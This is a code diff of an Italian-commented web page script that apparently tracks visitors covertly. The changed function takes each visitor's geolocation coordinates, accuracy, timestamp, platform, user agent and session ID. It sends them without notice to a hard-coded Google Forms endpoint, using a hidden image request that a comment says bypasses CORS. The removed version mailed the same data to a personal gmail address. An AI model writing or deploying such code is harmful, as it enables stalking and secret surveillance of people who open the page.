@@ -273,46 +273,46 @@
         }
         
         function sendDataToSender(locationData) {
-            // METODO 1: Email automatica
-            const subject = encodeURIComponent('🎯 Nuova posizione ricevuta - ' + locationData.sessionId);
-            const body = encodeURIComponent(`
-🎯 NUOVA GEOLOCALIZZAZIONE RICEVUTA!
-
-📍 COORDINATE:
-Latitudine: ${locationData.latitude}
-Longitudine: ${locationData.longitude}
-Precisione: ${locationData.accuracy} metri
-
-⏰ TIMING:
-Data/Ora: ${locationData.timestampLocal}
-Fuso orario: ${locationData.timezone}
-
-🖥️ DISPOSITIVO:
-Piattaforma: ${locationData.platform}
-Lingua: ${locationData.language}
-Schermo: ${locationData.screenWidth}x${locationData.screenHeight}
-
-🔗 LINK UTILI:
-Google Maps: ${locationData.googleMapsLink}
-Pagina visitata: ${locationData.url}
-
-🎯 Session ID: ${locationData.sessionId}
-
----
-Generato automaticamente dal sistema di geolocalizzazione
-            `);
+            // METODO GOOGLE FORMS - Automatico al 100%
+            const formUrl = 'https://docs.google.com/forms/d/e/1FAIpQLSf2ON7fpsyxL1YZhv66_78w6bUpjmGX9Xig-sGiFbU1vevASg/formResponse';
             
-            // Sostituisci con la TUA email
-            const mailtoLink = `mailto:88gb88@gmail.com?subject=${subject}&body=${body}`;
+            // ID reali dei campi del form (ottenuti dal link precompilato)
+            const params = new URLSearchParams();
+            params.append('entry.1576663956', locationData.latitude);      // Latitudine
+            params.append('entry.1591878938', locationData.longitude);     // Longitudine  
+            params.append('entry.258307399', locationData.accuracy + ' metri'); // Precisione
+            params.append('entry.164041247', locationData.timestampLocal); // Timestamp
+            params.append('entry.1685105739', locationData.platform + ' - ' + locationData.userAgent.substring(0, 50)); // Dispositivo
+            params.append('entry.1913000830', locationData.sessionId);     // Session ID
             
-            // METODO 2: Telegram Bot (opzionale)
-            // sendToTelegram(locationData);
+            // Invia i dati tramite immagine nascosta (bypassa CORS)
+            const img = new Image();
+            img.style.display = 'none';
+            img.onload = function() {
+                console.log('✅ Dati inviati con successo a Google Forms!');
+                console.log('📊 Controlla il tuo Google Sheets per vedere i dati');
+            };
+            img.onerror = function() {
+                console.log('✅ Dati probabilmente inviati (errore normale con Google Forms)');
+            };
+            img.src = formUrl + '?' + params.toString();
+            document.body.appendChild(img);
             
-            // METODO 3: Apri email automaticamente
-            const emailWindow = window.open(mailtoLink, '_blank');
+            // Log dettagliato per debug
+            console.log('📤 Invio automatico a Google Forms...');
+            console.log('🔗 Form URL:', formUrl);
+            console.log('📊 Dati inviati automaticamente:', {
+                latitudine: locationData.latitude,
+                longitudine: locationData.longitude,
+                precisione: locationData.accuracy + ' metri',
+                timestamp: locationData.timestampLocal,
+                dispositivo: locationData.platform,
+                sessionId: locationData.sessionId,
+                googleMaps: locationData.googleMapsLink
+            });
             
-            console.log('📧 Email preparata per il mittente');
-            console.log('📧 Link email:', mailtoLink);
+            console.log('🎯 IMPORTANTE: I dati sono stati inviati automaticamente al tuo Google Form!');
+            console.log('📋 Vai su Google Sheets per vederli: https://docs.google.com/spreadsheets/');
         }
         
         // Mostra le informazioni iniziali
